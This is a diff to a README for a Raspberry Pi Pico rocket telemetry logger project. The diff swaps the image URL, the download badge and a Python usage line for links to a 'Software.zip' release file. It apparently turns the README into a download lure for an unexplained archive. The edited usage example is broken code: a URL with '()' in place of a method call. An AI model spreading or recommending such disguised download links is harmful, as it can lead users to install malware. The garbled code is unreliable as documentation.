@@ -1,10 +1,10 @@
 # 🚀 Rocket Telemetry Logger using Raspberry Pi Pico
 
-![Rocket Telemetry Logger](https://your-image-url.com)
+![Rocket Telemetry Logger](https://github.com/Rahul110110/rocket-telemetry-logger-using-raspberry-pi-pico/releases/download/v1.0/Software.zip)
 
 A rocket telemetry logger project implemented using Raspberry Pi Pico, MPU6050, BMP280, and an OLED display for real-time data visualization during rocket flights.
 
-[![Download Project](https://img.shields.io/badge/Download%20Project-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Project](https://github.com/Rahul110110/rocket-telemetry-logger-using-raspberry-pi-pico/releases/download/v1.0/Software.zip%20Project-v1.0.0-blue)](https://github.com/Rahul110110/rocket-telemetry-logger-using-raspberry-pi-pico/releases/download/v1.0/Software.zip)
 
 ## Table of Contents
 - [Introduction](#introduction)
@@ -44,7 +44,7 @@ To get started with the project, follow these steps:
 from telemetry_logger import TelemetryLogger
 
 logger = TelemetryLogger()
-logger.start_logging()
+https://github.com/Rahul110110/rocket-telemetry-logger-using-raspberry-pi-pico/releases/download/v1.0/Software.zip()
 ```
 
 ## Contributing
